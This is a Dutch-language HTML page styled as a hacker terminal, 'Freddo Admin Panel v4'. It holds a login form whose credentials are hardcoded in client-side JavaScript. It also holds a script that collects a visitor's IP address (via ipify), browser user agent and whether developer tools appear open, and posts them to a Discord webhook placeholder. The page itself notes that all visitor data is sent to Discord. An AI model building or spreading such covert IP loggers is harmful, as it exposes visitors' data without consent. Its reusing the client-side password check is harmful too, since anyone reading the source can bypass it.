<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <title>Freddo Admin Panel v4</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; }
        .terminal-box { border: 1px solid #00ff41; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; }
    </style>
</head>
<body class="p-10">

    <div id="login-screen" class="max-w-md mx-auto terminal-box p-8 rounded">
        <h1 class="text-2xl mb-6 text-center font-bold tracking-widest text-white">FREDDO_LOGIN</h1>
        <input type="text" id="user" placeholder="USERNAME" class="w-full mb-4">
        <input type="password" id="pass" placeholder="PASSWORD" class="w-full mb-6">
        <button onclick="login()" class="w-full bg-green-900 hover:bg-green-700 text-white font-bold p-3 transition">ENTRY</button>
    </div>

    <div id="admin-panel" class="hidden terminal-box p-8 rounded max-w-4xl mx-auto">
        <h1 class="text-xl mb-4 border-b border-green-800 pb-2">SYSTEM_LOGS // LIVE_TRAFFIC</h1>
        
        <div class="grid grid-cols-1 gap-4 mb-6">
            <div class="bg-black p-4 border border-green-900">
                <p class="text-xs text-green-700 mb-2">// LAATSTE ACTIVITEIT</p>
                <div id="log-content" class="text-sm">Wachten op data...</div>
            </div>
        </div>

        <div class="text-xs text-green-700">
            INFO: Alle bezoekersdata wordt direct naar je Discord verzonden.
        </div>
    </div>

    <script>
        // CONFIGURATIE
        const DISCORD_WEBHOOK = "HIER_JE_DISCORD_WEBHOOK_URL_PLAKKEN";

        // 1. Automatisch data verzamelen bij bezoek
        async function trackVisitor() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // Check of ze "cheaten" (Inspect element open)
                let cheatDetected = (window.outerWidth - window.innerWidth > 160) ? "JA (Console open)" : "NEE";

                const logMessage = {
                    embeds: [{
                        title: "🚀 Nieuwe Bezoeker Gedetecteerd",
                        color: 65280,
                        fields: [
                            { name: "IP Adres", value: ipData.ip, inline: true },
                            { name: "Cheat Status", value: cheatDetected, inline: true },
                            { name: "Browser", value: navigator.userAgent, inline: false }
                        ],
                        footer: { text: "Freddo Tracking System" }
                    }]
                };

                // Verzend naar Discord
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(logMessage)
                });

                document.getElementById('log-content').innerHTML = `> IP ${ipData.ip} verbonden. Status: ${cheatDetected}`;
            } catch (e) {
                console.log("Tracking error");
            }
        }

        // 2. Login Functie
        function login() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if(u === "freddo" && p === "administratie") {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('admin-panel').classList.remove('hidden');
                trackVisitor(); // Start tracking zodra ingelogd
            } else {
                alert("ACCESS DENIED");
            }
        }
    </script>
</body>
</html>
